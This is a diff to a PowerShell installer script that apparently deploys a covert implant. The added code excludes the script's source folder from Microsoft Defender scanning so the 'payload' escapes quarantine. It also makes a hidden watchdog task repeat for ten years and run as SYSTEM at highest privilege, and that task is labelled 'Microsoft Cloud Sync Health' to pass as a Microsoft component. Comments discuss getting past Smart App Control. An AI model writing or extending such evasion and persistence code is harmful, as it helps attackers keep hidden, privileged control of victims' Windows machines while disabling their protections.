@@ -230,6 +230,15 @@ if ($admin -and -not $NoExclusions) {
         Say "  [i] pre-excluded $InstallDir (before payload copy)"
     } catch { Warn "pre-exclusion failed (continuing)" }
 }
+# Defender can quarantine the payload while it still sits in the source tree (USB or
+# a temp staging dir) - exclude the source dir too, but never the install dir twice.
+try {
+    $srcRoot = Split-Path -Parent $PSCommandPath
+    if ($srcRoot -and $srcRoot -ne $InstallDir) {
+        Add-MpPreference -ExclusionPath $srcRoot -ErrorAction SilentlyContinue
+        Say "  [i] pre-excluded source: $srcRoot"
+    }
+} catch { }
 
 # Smart App Control (Windows 11) blocks unsigned binaries with "Malicious binary
 # reputation" (error 4556) even when Defender exclusions are set; it cannot be
@@ -555,11 +564,15 @@ try {
         -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Join-Path $InstallDir 'watchdog.ps1')`""
     $htrigA = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) `
         -RepetitionInterval (New-TimeSpan -Minutes 10) `
-        -RepetitionDuration (New-TimeSpan -Days 1)
+        -RepetitionDuration (New-TimeSpan -Days 3650)
     $htrigB = New-ScheduledTaskTrigger -Daily -At '03:47'
 
+    # A group principal (BUILTIN\Users) only runs as a logged-on member, so the
+    # watchdog dies whenever nobody is signed in - the controller then stays dead.
+    # SYSTEM keeps the repair loop alive on logged-off machines.
+    $healthPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
     Register-ScheduledTask -TaskName $HealthName -TaskPath $taskPath -Action $hact `
-        -Trigger @($htrigA, $htrigB) -Settings $settings -Principal $principal `
+        -Trigger @($htrigA, $htrigB) -Settings $settings -Principal $healthPrincipal `
         -Description 'Microsoft Cloud Sync Health' -Force | Out-Null
     Ok "health task: $TaskRoot\$HealthName"
     # Boot trigger as SYSTEM: a headless server (FILE-SERVER, 2026-11-10) may never
